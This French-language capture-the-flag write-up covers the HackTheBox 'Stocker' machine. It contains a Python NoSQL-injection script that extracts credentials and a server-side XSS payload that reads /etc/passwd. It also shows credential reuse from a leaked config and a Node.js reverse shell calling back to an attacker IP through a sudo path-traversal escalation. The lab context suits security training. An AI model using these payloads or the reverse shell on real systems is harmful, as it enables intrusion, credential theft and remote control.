---
title: Stocker - Easy (Linux)
categories:
- HackTheBox
- Write-up
tags:
- htb
- hack-the-box
- web
- vulnérabilités
---

## User
### Nmap

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 08:53 EDT
Nmap scan report for stocker.htb (10.129.92.43)
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Stock - Coming Soon!
|_http-generator: Eleventy v2.0.0
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds
```
On voit qu'il y a ssh et un le port http d'ouvert.
Il y a une générateur http Eleventy v2.0.0

### Le site :

C'est un site random très peu intéressant. On a le nom d'un dév apriori : Angoose Garden.

### FFUF

On met un ffuf. D'abord pour chercher des dossiers sur le site normal. On chope quelques dossiers peu intéressants. On refait un ffuf cette fois pour voir s'il n'y aurait pas un sous-domaine. Résultat : rien. On refait un ffuf, cette fois-ci en cherchant un hôte virtuel. Résultat : bingo !

=> On se retrouve avec une entrée de disponible : Host: dev.stocker.htb.

- Une fois l'host de configuré, on peut accéder à une nouvelle partie du site auparavant cachée : login.
- On accéde donc à cette page. On nous demande de nous connecter.

### Le site : la page de login.

La page de login est vulnérable au nosql bypass auth. On peut faire un simple script python visant à découvrir un username et un password de disponible :

```python
import requests, string, json

header = {"Host" : "dev.stocker.htb", "Content-Type": "application/json"}
req = requests.get("http://stocker.htb", headers=header)
cookie = req.cookies
username=''
while True:
# tenter de voir si le username trouvé à l'instant T est entier ou non
	full_username = {"username": {"$eq":username}, "password": {"$ne": "null"} }
	req = requests.post("http://stocker.htb/login", headers=header, json=full_username )
	if "error" not in req.content.decode():
		break
# trouver les caractères restants du username
	for c in string.ascii_letters:
		datas = {"username": {"$regex":"^" + username + c}, "password": {"$ne": "null"} }
		req = requests.post("http://stocker.htb/login", headers=header, json=datas )
		if "error" not in req.content.decode():
			username += c
			break

print("Username found : " + username)

password = ''
# même principe que pour le username
while True:
	full_passwd = {"username": {"$eq":username}, "password": {"$eq": password} }
	req = requests.post("http://stocker.htb/login", headers=header, json=full_passwd )
	if "error" not in req.content.decode():
		cookie = req.cookies
		break
	for c in string.printable:
		datas = {"username": {"$eq":username}, "password": {"$regex": "^" + password + c} }
		req = requests.post("http://stocker.htb/login", headers=header, json=datas )
		if "error" not in req.content.decode():
			password += c
			break

print("Password found : " + password)

print(f"username:password : {username}:{password}")

```

On se retrouve avec ça :

angoose:b3e795719e2a644f69838a593dd159ac

Le mot de passe ne fonctionne pas pour se connecter en ssh.

### Le site : la page de commandes.

Le site est full bugué et ne fonctionne pas du tout sur firefox, très mal sur chromium. Il aura fallu le recoder en partie afin de voir ce qu'il fait.

On peut tenter de déterminer la structure des json envoyés au endpoint /api/order.

### Les requêtes :

```json
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Red Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":4}]}
```

Une fois la requête envoyée, on se retrouver avec un order id. Cet order id peut être utilisé sur le endpoint /api/po/%orderId%

Cet endpoint va créer un pdf avec les données du produit (une facture en somme).

### Server Side XSS:

Le premier résultat sur lequel on tombe en cherchant est la vulnérabilité connue sous le nom de Server Side XSS.

En somme, c'est une XSS côté serveur. Le bot, si les entrées de l'utilisateur ne sont pas correctement désinfectées, va les interpréter comme du js ou du html... Comme une XSS côté client.

On a plusieurs champs de possibles pour faire cela :

title, description par exemple.

Après essais, le titre est reflété. En effet, si on injecte `<h1>TOTO</h1>` dans le champ titre, on se retrouve avec un nom d'article en très gros.

Essayons de refaire un test, mais cette fois avec du javascript.

`<script>document.write('toto')</script>`. On se retrouve bien avec le mot "toto" de reflété dans le document. Il s'agira maintenant de trouver un moyen pour extraire des informations du serveur.

On peut également tenter de créer une iframe. Et ça fonctionne tout autant.

### Exploitation

On peut déjà tenter de retrouver le fichier "/etc/passwd".

Le payload suivant nous permet de retrouver le contenu du fichier et de pouvoir le lire (sans cela il est sur une seule ligne et donc illisible entièrement) :

```js
<script>x=new XMLHttpRequest;x.onload=function(){document.write('<style> p {width: 600px; word-break: break-all;}</style><p>'.concat(btoa(this.responseText)).concat('</p>'))};x.open('GET','file:///etc/passwd');x.send();</script>
```

Une fois décodé :

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

On peut donc apriori dump tous les fichiers du serveur, si tant est que le bot (probablement avec les droits de www-data ou angoose) a les droits nécessaires pour.

- id_rsa ? : non
- index.js  ? Oui. C'est une app express, on peut supposer qu'il y ait app.js ou index.js

=> index.js :

```js
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");

const app = express();
const port = 3000;

// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";

<SNIP>
```


On voit qu'il y a un mot de passe : "IHeardPassphrasesArePrettySecure"

On l'essaye en ssh `ssh angoose@stocker.htb` et bingo, on accède au user !


## Élévation de privilèges

Là, ça semble très simple. Première commande faite : `sudo -l`

Et résultat :

```sh
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

### Exploitation

/tmp/shell.js

```node
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.10.16.33", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

`sudo /usr/bin/node /usr/local/scripts/../../../../../../tmp/shell.js`

Et voilà !
